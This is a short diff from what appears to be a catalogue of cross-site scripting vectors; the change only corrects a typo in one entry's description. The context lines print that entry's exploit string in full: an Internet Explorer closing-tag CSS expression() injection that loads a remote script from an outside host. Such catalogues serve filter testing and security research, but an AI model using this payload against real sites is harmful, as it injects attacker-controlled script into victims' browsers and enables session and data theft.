@@ -547,7 +547,7 @@ Author Name: .mario
 IE closing-tag expression injection
 Exploit Name: IE closing-tag expression injection
 Exploit String: </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
-Exploit Description: This vector exploits a bug in IE whre attributes in closing comments are evaluated.
+Exploit Description: This vector exploits a bug in IE where attributes in closing comments are evaluated.
 Exploit Tags: general, injection, internet explorer
 Author Name: .mario
 
